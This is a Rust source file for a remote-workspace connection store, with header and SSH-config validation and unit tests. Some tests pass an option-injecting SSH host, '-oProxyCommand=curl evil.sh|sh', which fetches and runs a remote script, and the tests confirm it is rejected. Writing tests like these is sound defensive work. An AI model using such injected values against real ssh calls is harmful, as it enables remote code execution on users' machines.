use chrono::Utc;
use std::collections::{HashMap, HashSet};

use sea_orm::DatabaseConnection;
use sea_orm::{
    ActiveModelTrait, ActiveValue::NotSet, EntityTrait, IntoActiveModel, QueryOrder, Set,
    TransactionTrait,
};

use crate::app_error::AppCommandError;
use crate::db::entities::remote_workspace_connection;
use crate::db::error::DbError;
use crate::models::{
    RemoteWorkspaceConnectionInfo, RemoteWorkspaceHeader, RemoteWorkspaceSshConfig,
};

/// Names the client sets itself, on the HTTP calls and on the WebSocket
/// handshake. The save fails rather than silently drop what the user typed.
/// A slice, not a fixed-size array: the length is one more thing to forget to
/// bump when a name is added.
const RESERVED_HEADER_NAMES: &[&str] = &[
    "authorization",
    "content-type",
    "content-length",
    // `hyper` frames the body itself and picks chunked for the streaming
    // workspace upload. A user-supplied framing header contradicts it, and it
    // is also the header a request-smuggling attempt rides in on — which is
    // the one thing not to hand to a fronting proxy.
    "transfer-encoding",
    "host",
    "connection",
    "upgrade",
    "sec-websocket-key",
    "sec-websocket-version",
    "sec-websocket-protocol",
    "sec-websocket-extensions",
];

/// A stored `ssh_config` that will not parse.
///
/// This is deliberately NOT tolerated the way a bad `headers` value is. Falling
/// back to `None` would silently reclassify an SSH profile as a plain HTTP one,
/// and the `base_url`/`token` columns of an SSH profile hold a *stale loopback
/// endpoint* — the port from some earlier tunnel. The connection would then
/// appear to work and quietly point at whatever now answers on that local port.
/// Refusing to load the row is the only safe reading.
fn ssh_from_column(
    id: i32,
    raw: Option<&str>,
) -> Result<Option<RemoteWorkspaceSshConfig>, AppCommandError> {
    let Some(raw) = raw else {
        return Ok(None);
    };
    let parsed: RemoteWorkspaceSshConfig = serde_json::from_str(raw).map_err(|e| {
        AppCommandError::configuration_invalid(format!(
            "Remote connection {id} has an unreadable SSH configuration"
        ))
        .with_detail(e.to_string())
    })?;
    // A stored locator still has to satisfy the same rules as a new one: the
    // validator is the only thing standing between a hand-edited database and an
    // `ssh` argv that contains an option.
    let validated = crate::ssh::config::validate_ssh_config(&parsed).map_err(|e| {
        AppCommandError::configuration_invalid(format!(
            "Remote connection {id} has an invalid SSH configuration"
        ))
        .with_detail(e.message)
    })?;
    Ok(Some(validated))
}

fn to_info(
    model: remote_workspace_connection::Model,
) -> Result<RemoteWorkspaceConnectionInfo, AppCommandError> {
    let ssh = ssh_from_column(model.id, model.ssh_config.as_deref())?;
    Ok(RemoteWorkspaceConnectionInfo {
        id: model.id,
        name: model.name,
        base_url: model.base_url,
        token: model.token,
        headers: serde_json::from_str(&model.headers).unwrap_or_default(),
        ssh,
        sort_order: model.sort_order,
        created_at: model.created_at,
        updated_at: model.updated_at,
    })
}

pub fn validate_headers(
    headers: &[RemoteWorkspaceHeader],
) -> Result<Vec<RemoteWorkspaceHeader>, AppCommandError> {
    let mut result = Vec::with_capacity(headers.len());
    for header in headers {
        let name = header.name.trim();
        let value = header.value.trim();
        if name.is_empty() && value.is_empty() {
            continue;
        }
        if name.is_empty() {
            return Err(AppCommandError::invalid_input(
                "Custom header name is required",
            ));
        }
        if RESERVED_HEADER_NAMES.contains(&name.to_ascii_lowercase().as_str()) {
            return Err(AppCommandError::invalid_input(format!(
                "Custom header \"{name}\" is reserved by Codeg"
            )));
        }
        header.to_header_pair().map_err(|e| {
            AppCommandError::invalid_input(format!("Custom header \"{name}\" is invalid"))
                .with_detail(e.to_string())
        })?;
        result.push(RemoteWorkspaceHeader {
            name: name.to_string(),
            value: value.to_string(),
        });
    }
    Ok(result)
}

fn serialize_headers(headers: &[RemoteWorkspaceHeader]) -> Result<String, AppCommandError> {
    serde_json::to_string(headers).map_err(|e| {
        AppCommandError::invalid_input("Failed to store custom headers").with_detail(e.to_string())
    })
}

pub fn normalize_base_url(raw: &str) -> Result<String, AppCommandError> {
    let trimmed = raw.trim().trim_end_matches('/').to_string();
    let parsed = reqwest::Url::parse(&trimmed).map_err(|e| {
        AppCommandError::invalid_input("Remote Workspace URL is invalid").with_detail(e.to_string())
    })?;
    match parsed.scheme() {
        "http" | "https" => Ok(trimmed),
        _ => Err(AppCommandError::invalid_input(
            "Remote Workspace URL must use http or https",
        )),
    }
}

fn validate_name(name: &str) -> Result<String, AppCommandError> {
    let trimmed = name.trim();
    if trimmed.is_empty() {
        return Err(AppCommandError::invalid_input(
            "Remote connection name is required",
        ));
    }
    Ok(trimmed.to_string())
}

fn validate_token(token: &str) -> Result<String, AppCommandError> {
    let trimmed = token.trim();
    if trimmed.is_empty() {
        return Err(AppCommandError::invalid_input(
            "Remote connection token is required",
        ));
    }
    Ok(trimmed.to_string())
}

/// List every connection.
///
/// One unreadable SSH row must not take the whole list down — the manage dialog
/// is where the user would go to *fix* it. The bad row is logged and skipped, so
/// every other profile stays reachable. `get` is the strict counterpart: opening
/// a specific broken connection fails loudly rather than silently falling back.
pub async fn list(
    conn: &DatabaseConnection,
) -> Result<Vec<RemoteWorkspaceConnectionInfo>, DbError> {
    let rows = remote_workspace_connection::Entity::find()
        .order_by_asc(remote_workspace_connection::Column::SortOrder)
        .order_by_asc(remote_workspace_connection::Column::Name)
        .all(conn)
        .await?;
    Ok(rows
        .into_iter()
        .filter_map(|row| {
            let id = row.id;
            match to_info(row) {
                Ok(info) => Some(info),
                Err(err) => {
                    tracing::error!(
                        "[RemoteWorkspace] skipping connection {id}: {} ({:?})",
                        err.message,
                        err.detail
                    );
                    None
                }
            }
        })
        .collect())
}

pub async fn get(
    conn: &DatabaseConnection,
    id: i32,
) -> Result<Option<RemoteWorkspaceConnectionInfo>, AppCommandError> {
    let row = remote_workspace_connection::Entity::find_by_id(id)
        .one(conn)
        .await
        .map_err(DbError::from)
        .map_err(AppCommandError::db)?;
    row.map(to_info).transpose()
}

/// The stored shape of a connection's mode-specific fields.
///
/// An SSH profile has no user-supplied URL, token or headers: the endpoint and
/// the credential are discovered at connect time, and there is no proxy in front
/// of a loopback forward for a custom header to authenticate to. The frontend
/// sends those three as empty values for an SSH profile and this is where they
/// are *ignored* rather than validated — running them through `validate_token`
/// would reject an SSH save for missing a token it must not have.
struct StoredFields {
    base_url: String,
    token: String,
    headers: String,
    ssh_config: Option<String>,
}

fn resolve_stored_fields(
    base_url: &str,
    token: &str,
    headers: &[RemoteWorkspaceHeader],
    ssh: Option<&RemoteWorkspaceSshConfig>,
) -> Result<StoredFields, AppCommandError> {
    match ssh {
        Some(raw) => {
            let validated = crate::ssh::config::validate_ssh_config(raw)?;
            let ssh_config = serde_json::to_string(&validated).map_err(|e| {
                AppCommandError::invalid_input("Failed to store the SSH configuration")
                    .with_detail(e.to_string())
            })?;
            Ok(StoredFields {
                // Placeholders. `base_url` is NOT NULL and is what a legacy
                // reader would show, so it records the host rather than a
                // fabricated URL — a stale `http://127.0.0.1:<port>` would be
                // actively misleading, since the real port changes per tunnel.
                base_url: format!("ssh://{}", validated.host),
                token: String::new(),
                headers: "[]".to_string(),
                ssh_config: Some(ssh_config),
            })
        }
        None => Ok(StoredFields {
            base_url: normalize_base_url(base_url)?,
            token: validate_token(token)?,
            headers: serialize_headers(&validate_headers(headers)?)?,
            ssh_config: None,
        }),
    }
}

pub async fn create(
    conn: &DatabaseConnection,
    name: &str,
    base_url: &str,
    token: &str,
    headers: &[RemoteWorkspaceHeader],
    ssh: Option<&RemoteWorkspaceSshConfig>,
) -> Result<RemoteWorkspaceConnectionInfo, AppCommandError> {
    let now = Utc::now();
    let fields = resolve_stored_fields(base_url, token, headers, ssh)?;
    let max_order = remote_workspace_connection::Entity::find()
        .order_by_desc(remote_workspace_connection::Column::SortOrder)
        .one(conn)
        .await
        .map_err(DbError::from)
        .map_err(AppCommandError::db)?
        .map(|m| m.sort_order)
        .unwrap_or(-1);
    let active = remote_workspace_connection::ActiveModel {
        id: NotSet,
        name: Set(validate_name(name)?),
        base_url: Set(fields.base_url),
        token: Set(fields.token),
        headers: Set(fields.headers),
        ssh_config: Set(fields.ssh_config),
        sort_order: Set(max_order + 1),
        created_at: Set(now),
        updated_at: Set(now),
    };
    let model = active
        .insert(conn)
        .await
        .map_err(DbError::from)
        .map_err(AppCommandError::db)?;
    to_info(model)
}

/// Update a connection, including switching it between HTTP and SSH mode.
///
/// A mode switch is a real possibility here, and each direction has a trap.
/// Switching HTTP → SSH must not keep the old `base_url`/`token` around as a
/// usable fallback (the tunnel endpoint is the only correct one), and switching
/// SSH → HTTP must not keep the stale loopback URL the last tunnel happened to
/// use. `prepare_fields` handles both by deriving the stored columns from the
/// mode rather than from what the caller sent.
///
/// Note the caller is responsible for dropping any cached SSH tunnel for this id
/// after a successful update — see `commands::remote_workspace::update_*`. An
/// edited host with a live tunnel to the *old* host would otherwise keep serving
/// from it.
pub async fn update(
    conn: &DatabaseConnection,
    id: i32,
    name: &str,
    base_url: &str,
    token: &str,
    headers: &[RemoteWorkspaceHeader],
    ssh: Option<&RemoteWorkspaceSshConfig>,
) -> Result<RemoteWorkspaceConnectionInfo, AppCommandError> {
    let name = validate_name(name)?;
    let fields = resolve_stored_fields(base_url, token, headers, ssh)?;
    let row = remote_workspace_connection::Entity::find_by_id(id)
        .one(conn)
        .await
        .map_err(DbError::from)
        .map_err(AppCommandError::db)?
        .ok_or_else(|| AppCommandError::not_found(format!("Remote connection {id} not found")))?;

    let mut active = row.into_active_model();
    active.name = Set(name);
    active.base_url = Set(fields.base_url);
    active.token = Set(fields.token);
    active.headers = Set(fields.headers);
    active.ssh_config = Set(fields.ssh_config);
    active.updated_at = Set(Utc::now());
    let model = active
        .update(conn)
        .await
        .map_err(DbError::from)
        .map_err(AppCommandError::db)?;
    to_info(model)
}

pub async fn delete(conn: &DatabaseConnection, id: i32) -> Result<(), DbError> {
    remote_workspace_connection::Entity::delete_by_id(id)
        .exec(conn)
        .await?;
    Ok(())
}

pub async fn reorder(conn: &DatabaseConnection, ids: Vec<i32>) -> Result<(), AppCommandError> {
    if ids.is_empty() {
        return Ok(());
    }

    let unique_ids = ids.iter().copied().collect::<HashSet<_>>();
    if unique_ids.len() != ids.len() {
        return Err(AppCommandError::invalid_input(
            "Remote workspace order contains duplicate connections",
        ));
    }

    let rows = remote_workspace_connection::Entity::find()
        .all(conn)
        .await
        .map_err(DbError::from)
        .map_err(AppCommandError::db)?;
    let existing_ids = rows.iter().map(|row| row.id).collect::<HashSet<_>>();
    if existing_ids != unique_ids {
        return Err(AppCommandError::invalid_input(
            "Remote workspace order must include every connection exactly once",
        ));
    }

    let now = Utc::now();
    let mut rows_by_id = rows
        .into_iter()
        .map(|row| (row.id, row))
        .collect::<HashMap<_, _>>();
    let txn = conn
        .begin()
        .await
        .map_err(DbError::from)
        .map_err(AppCommandError::db)?;
    for (idx, id) in ids.into_iter().enumerate() {
        let Some(row) = rows_by_id.remove(&id) else {
            return Err(AppCommandError::invalid_input(
                "Remote workspace order contains an unknown connection",
            ));
        };
        let mut active = row.into_active_model();
        active.sort_order = Set(idx as i32);
        active.updated_at = Set(now);
        active
            .update(&txn)
            .await
            .map_err(DbError::from)
            .map_err(AppCommandError::db)?;
    }
    txn.commit()
        .await
        .map_err(DbError::from)
        .map_err(AppCommandError::db)?;

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db::test_helpers::fresh_in_memory_db;
    use crate::models::ToHeaderMap;

    #[test]
    fn normalize_base_url_trims_and_removes_trailing_slashes() {
        let actual = normalize_base_url("  http://127.0.0.1:3080///  ").unwrap();
        assert_eq!(actual, "http://127.0.0.1:3080");
    }

    #[test]
    fn normalize_base_url_rejects_non_http_schemes() {
        let err = normalize_base_url("file:///tmp/codeg").unwrap_err();
        assert!(err.message.contains("http"));
    }

    fn header(name: &str, value: &str) -> RemoteWorkspaceHeader {
        RemoteWorkspaceHeader {
            name: name.to_string(),
            value: value.to_string(),
        }
    }

    #[test]
    fn validate_headers_trims_and_drops_empty_rows() {
        let actual = validate_headers(&[
            header("  CF-Access-Client-Id  ", "  abc123  "),
            header("", ""),
            header("   ", "  "),
        ])
        .unwrap();
        assert_eq!(actual, vec![header("CF-Access-Client-Id", "abc123")]);
    }

    #[test]
    fn validate_headers_keeps_repeated_names_and_order() {
        let input = vec![header("X-Trace", "a"), header("X-Trace", "b")];
        assert_eq!(validate_headers(&input).unwrap(), input);
    }

    #[test]
    fn to_header_map_keeps_repeats_and_skips_unparsable_rows() {
        let map = [
            header("X-Trace", "a"),
            header("X-Trace", "b"),
            header("bad header", "dropped"),
            header("  ", "dropped"),
        ]
        .to_header_map();
        assert_eq!(
            map.get_all("x-trace")
                .iter()
                .map(|v| v.to_str().unwrap())
                .collect::<Vec<_>>(),
            vec!["a", "b"]
        );
        assert_eq!(map.len(), 2);
    }

    #[test]
    fn to_header_map_marks_every_value_sensitive() {
        // A custom header is a credential. Sensitive keeps it out of the HTTP/2
        // HPACK dynamic table and out of any `{:?}` of the request.
        let map = [header("CF-Access-Client-Secret", "s3cret")].to_header_map();
        let value = map.get("cf-access-client-secret").unwrap();
        assert!(value.is_sensitive());
        assert_eq!(format!("{value:?}"), "Sensitive");
    }

    #[test]
    fn validate_headers_rejects_reserved_names() {
        for name in [
            "Authorization",
            "content-type",
            "Transfer-Encoding",
            "Sec-WebSocket-Protocol",
        ] {
            let err = validate_headers(&[header(name, "x")]).unwrap_err();
            assert!(
                err.message.contains("reserved"),
                "expected {name} to be reserved, got {}",
                err.message
            );
        }
    }

    #[test]
    fn validate_headers_rejects_invalid_name_value_and_missing_name() {
        assert!(validate_headers(&[header("bad header", "x")]).is_err());
        assert!(validate_headers(&[header("X-Bad", "line\nbreak")]).is_err());
        assert!(validate_headers(&[header("", "orphan-value")]).is_err());
    }

    #[tokio::test]
    async fn create_list_update_delete_roundtrip() {
        let db = fresh_in_memory_db().await;
        let created = create(
            &db.conn,
            "Local 3080",
            "http://127.0.0.1:3080/",
            "secret-token",
            &[header("CF-Access-Client-Id", "abc123")],
            None,
        )
        .await
        .unwrap();
        assert_eq!(created.name, "Local 3080");
        assert_eq!(created.base_url, "http://127.0.0.1:3080");
        assert_eq!(created.token, "secret-token");
        assert_eq!(
            created.headers,
            vec![header("CF-Access-Client-Id", "abc123")]
        );
        assert_eq!(created.sort_order, 0);

        let listed = list(&db.conn).await.unwrap();
        assert_eq!(listed.len(), 1);
        assert_eq!(listed[0].id, created.id);
        assert_eq!(listed[0].headers, created.headers);

        let updated = update(
            &db.conn,
            created.id,
            "Server A",
            "https://codeg.example.com/",
            "next-token",
            &[],
            None,
        )
        .await
        .unwrap();
        assert_eq!(updated.name, "Server A");
        assert_eq!(updated.base_url, "https://codeg.example.com");
        assert!(updated.headers.is_empty());

        delete(&db.conn, created.id).await.unwrap();
        assert!(list(&db.conn).await.unwrap().is_empty());
    }

    /// The upgrade path, which is every existing install: rows written before
    /// the `headers` column existed. `ADD COLUMN NOT NULL DEFAULT '[]'` has to
    /// backfill them — a NULL there fails to deserialize into `Model.headers:
    /// String` and takes the whole connection list down, not just the headers.
    /// The insert omits `headers` exactly the way the old schema did.
    #[tokio::test]
    async fn list_reads_a_row_written_without_the_headers_column() {
        use sea_orm::{ConnectionTrait, DbBackend, Statement};

        let db = fresh_in_memory_db().await;
        // Seeded through `create` so the legacy row can copy its timestamps
        // verbatim, rather than guessing SeaORM's SQLite datetime encoding.
        let seed = create(
            &db.conn,
            "Seed",
            "http://127.0.0.1:3080",
            "token",
            &[],
            None,
        )
        .await
        .unwrap();
        db.conn
            .execute(Statement::from_string(
                DbBackend::Sqlite,
                "INSERT INTO remote_workspace_connection \
                 (name, base_url, token, sort_order, created_at, updated_at) \
                 SELECT 'Legacy', 'http://127.0.0.1:3099', token, 1, \
                 created_at, updated_at FROM remote_workspace_connection"
                    .to_owned(),
            ))
            .await
            .unwrap();

        let listed = list(&db.conn).await.unwrap();
        assert_eq!(
            listed.iter().map(|c| c.name.as_str()).collect::<Vec<_>>(),
            vec!["Seed", "Legacy"]
        );
        assert!(listed[1].headers.is_empty());

        // `create` re-reads every column to find the max sort order, so the
        // legacy row has to survive that read too.
        let next = create(
            &db.conn,
            "Next",
            "http://127.0.0.1:3081",
            "token",
            &[],
            None,
        )
        .await
        .unwrap();
        assert_eq!(next.sort_order, 2);
        assert_ne!(next.id, seed.id);
    }

    fn ssh(host: &str) -> RemoteWorkspaceSshConfig {
        RemoteWorkspaceSshConfig {
            host: host.to_string(),
            ..Default::default()
        }
    }

    /// An SSH profile stores the locator and nothing that looks like a usable
    /// HTTP endpoint. The frontend sends empty url/token/headers for this mode,
    /// and they must be ignored rather than rejected.
    #[tokio::test]
    async fn create_accepts_an_ssh_profile_with_empty_http_fields() {
        let db = fresh_in_memory_db().await;
        let created = create(
            &db.conn,
            "Build box",
            "",
            "",
            &[],
            Some(&RemoteWorkspaceSshConfig {
                host: "build-box".into(),
                username: Some("ann".into()),
                port: Some(2222),
                identity_file: Some("~/.ssh/id_ed25519".into()),
                remember_password: true,
                credential_id: Some("73baf9d8-b681-4f2f-bf89-4ece1396fc65".into()),
            }),
        )
        .await
        .unwrap();

        let stored = created.ssh.as_ref().expect("ssh locator persisted");
        assert_eq!(stored.host, "build-box");
        assert_eq!(stored.username.as_deref(), Some("ann"));
        assert_eq!(stored.port, Some(2222));
        assert_eq!(stored.identity_file.as_deref(), Some("~/.ssh/id_ed25519"));
        assert!(stored.remember_password);
        assert_eq!(
            stored.credential_id.as_deref(),
            Some("73baf9d8-b681-4f2f-bf89-4ece1396fc65")
        );
        assert!(created.is_ssh());
        // Never a dialable http(s) URL: an SSH profile's endpoint only exists
        // once a tunnel is up.
        assert!(
            !created.base_url.starts_with("http"),
            "stored base_url must not masquerade as a usable endpoint: {}",
            created.base_url
        );
        assert!(created.token.is_empty(), "no token is persisted for SSH");

        // And it survives a re-read.
        let fetched = get(&db.conn, created.id).await.unwrap().unwrap();
        assert_eq!(
            fetched.ssh.as_ref().map(|s| s.host.clone()).as_deref(),
            Some("build-box")
        );
    }

    /// An unset port must stay unset through a save/load cycle: writing 22 would
    /// silently override a `~/.ssh/config` that says otherwise.
    #[tokio::test]
    async fn an_unset_ssh_port_is_not_defaulted_on_the_way_through_the_db() {
        let db = fresh_in_memory_db().await;
        let created = create(&db.conn, "Box", "", "", &[], Some(&ssh("box")))
            .await
            .unwrap();
        let stored = created.ssh.unwrap();
        assert_eq!(stored.port, None);
        assert_eq!(stored.username, None);
        assert_eq!(stored.identity_file, None);
    }

    /// Injection is rejected at the service boundary too, not only in the
    /// command layer — the database must never come to hold an argv-poisoning
    /// locator.
    #[tokio::test]
    async fn create_rejects_an_option_injecting_ssh_host() {
        let db = fresh_in_memory_db().await;
        let err = create(
            &db.conn,
            "Evil",
            "",
            "",
            &[],
            Some(&ssh("-oProxyCommand=curl evil.sh|sh")),
        )
        .await
        .unwrap_err();
        assert!(matches!(
            err.code,
            crate::app_error::AppErrorCode::InvalidInput
        ));
        assert!(
            list(&db.conn).await.unwrap().is_empty(),
            "nothing was stored"
        );
    }

    /// Switching SSH → HTTP must replace the placeholder locator wholesale, and
    /// HTTP → SSH must not leave the old URL/token behind as a usable fallback.
    #[tokio::test]
    async fn switching_between_http_and_ssh_leaves_no_stale_credentials() {
        let db = fresh_in_memory_db().await;
        let http = create(
            &db.conn,
            "Server",
            "https://codeg.example.com",
            "http-token",
            &[header("CF-Access-Client-Id", "abc")],
            None,
        )
        .await
        .unwrap();
        assert!(!http.is_ssh());

        let as_ssh = update(&db.conn, http.id, "Server", "", "", &[], Some(&ssh("box")))
            .await
            .unwrap();
        assert!(as_ssh.is_ssh());
        assert!(
            as_ssh.token.is_empty(),
            "the old HTTP token must not survive the switch to SSH"
        );
        assert!(
            !as_ssh.base_url.starts_with("http"),
            "the old HTTP URL must not survive: {}",
            as_ssh.base_url
        );
        assert!(
            as_ssh.headers.is_empty(),
            "custom headers do not apply to a loopback tunnel"
        );

        let back_to_http = update(
            &db.conn,
            http.id,
            "Server",
            "https://codeg.example.com",
            "fresh-token",
            &[],
            None,
        )
        .await
        .unwrap();
        assert!(!back_to_http.is_ssh());
        assert_eq!(back_to_http.ssh, None, "the SSH locator is cleared");
        assert_eq!(back_to_http.token, "fresh-token");
    }

    /// The load-bearing compatibility guarantee: every row written before this
    /// column existed has `ssh_config IS NULL` and must read back as a plain
    /// HTTP profile, unchanged.
    #[tokio::test]
    async fn legacy_rows_without_an_ssh_column_stay_plain_http() {
        use sea_orm::{ConnectionTrait, DbBackend, Statement};

        let db = fresh_in_memory_db().await;
        create(
            &db.conn,
            "Seed",
            "http://127.0.0.1:3080",
            "token",
            &[],
            None,
        )
        .await
        .unwrap();
        db.conn
            .execute(Statement::from_string(
                DbBackend::Sqlite,
                "INSERT INTO remote_workspace_connection \
                 (name, base_url, token, headers, sort_order, created_at, updated_at) \
                 SELECT 'Legacy', 'http://127.0.0.1:3099', token, '[]', 1, \
                 created_at, updated_at FROM remote_workspace_connection"
                    .to_owned(),
            ))
            .await
            .unwrap();

        let listed = list(&db.conn).await.unwrap();
        assert_eq!(listed.len(), 2);
        for item in &listed {
            assert_eq!(item.ssh, None, "{} must read as HTTP", item.name);
            assert!(!item.is_ssh());
        }
        assert_eq!(listed[1].base_url, "http://127.0.0.1:3099");
    }

    /// A hand-edited or corrupted `ssh_config` must NOT quietly degrade into an
    /// HTTP profile: the `base_url` column of an SSH row is a placeholder, and
    /// treating it as real would point the connection at whatever now answers on
    /// some old loopback port. `get` fails loudly; `list` skips the row so the
    /// rest of the manage dialog still works.
    #[tokio::test]
    async fn an_unreadable_ssh_config_is_refused_rather_than_downgraded() {
        use sea_orm::{ConnectionTrait, DbBackend, Statement};

        let db = fresh_in_memory_db().await;
        let good = create(
            &db.conn,
            "Good",
            "http://127.0.0.1:3080",
            "token",
            &[],
            None,
        )
        .await
        .unwrap();
        let broken = create(&db.conn, "Broken", "", "", &[], Some(&ssh("box")))
            .await
            .unwrap();

        for poison in [
            "",
            "   ",
            "not json at all",
            "{\"host\":\"-oProxyCommand=evil\"}",
            "{\"host\":\"\"}",
            "{}",
        ] {
            db.conn
                .execute(Statement::from_sql_and_values(
                    DbBackend::Sqlite,
                    "UPDATE remote_workspace_connection SET ssh_config = ?1 WHERE id = ?2",
                    [poison.into(), broken.id.into()],
                ))
                .await
                .unwrap();

            let err = get(&db.conn, broken.id).await.unwrap_err();
            assert!(
                matches!(
                    err.code,
                    crate::app_error::AppErrorCode::ConfigurationInvalid
                ),
                "poison {poison:?} should be refused, got {:?}",
                err.code
            );

            let listed = list(&db.conn).await.unwrap();
            assert_eq!(
                listed.iter().map(|c| c.id).collect::<Vec<_>>(),
                vec![good.id],
                "the broken row is skipped but the good one survives ({poison:?})"
            );
        }
    }

    #[tokio::test]
    async fn reorder_updates_list_order() {
        let db = fresh_in_memory_db().await;
        let first = create(
            &db.conn,
            "First",
            "http://127.0.0.1:3080",
            "token-a",
            &[],
            None,
        )
        .await
        .unwrap();
        let second = create(
            &db.conn,
            "Second",
            "http://127.0.0.1:3081",
            "token-b",
            &[],
            None,
        )
        .await
        .unwrap();
        let third = create(
            &db.conn,
            "Third",
            "http://127.0.0.1:3082",
            "token-c",
            &[],
            None,
        )
        .await
        .unwrap();

        reorder(&db.conn, vec![third.id, first.id, second.id])
            .await
            .unwrap();

        let listed = list(&db.conn).await.unwrap();
        assert_eq!(
            listed.iter().map(|item| item.id).collect::<Vec<_>>(),
            vec![third.id, first.id, second.id]
        );
        assert_eq!(
            listed
                .iter()
                .map(|item| item.sort_order)
                .collect::<Vec<_>>(),
            vec![0, 1, 2]
        );
    }

    #[tokio::test]
    async fn reorder_rejects_partial_or_duplicate_ids() {
        let db = fresh_in_memory_db().await;
        let first = create(
            &db.conn,
            "First",
            "http://127.0.0.1:3080",
            "token-a",
            &[],
            None,
        )
        .await
        .unwrap();
        let second = create(
            &db.conn,
            "Second",
            "http://127.0.0.1:3081",
            "token-b",
            &[],
            None,
        )
        .await
        .unwrap();

        let duplicate = reorder(&db.conn, vec![first.id, first.id])
            .await
            .unwrap_err();
        assert!(matches!(
            duplicate.code,
            crate::app_error::AppErrorCode::InvalidInput
        ));

        let partial = reorder(&db.conn, vec![second.id]).await.unwrap_err();
        assert!(matches!(
            partial.code,
            crate::app_error::AppErrorCode::InvalidInput
        ));

        let listed = list(&db.conn).await.unwrap();
        assert_eq!(
            listed.iter().map(|item| item.id).collect::<Vec<_>>(),
            vec![first.id, second.id]
        );
    }
}
